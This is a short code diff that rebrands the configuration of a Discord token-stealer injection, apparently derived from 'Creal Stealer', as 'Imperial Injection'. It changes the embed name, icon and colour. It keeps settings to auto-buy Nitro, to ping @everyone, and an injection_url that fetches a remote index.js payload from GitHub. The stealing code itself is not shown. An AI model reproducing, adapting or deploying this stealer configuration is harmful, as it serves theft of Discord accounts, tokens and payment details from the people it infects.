@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
+  embed_name: 'Imperial Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/mapesGithub/inject/main/xd.jpg'.replace(/ /g, '%20'), 
+  embed_color: 10038562, 
   injection_url: 'https://raw.githubusercontent.com/mapesGithub/inject/main/index.js', 
   /**
    
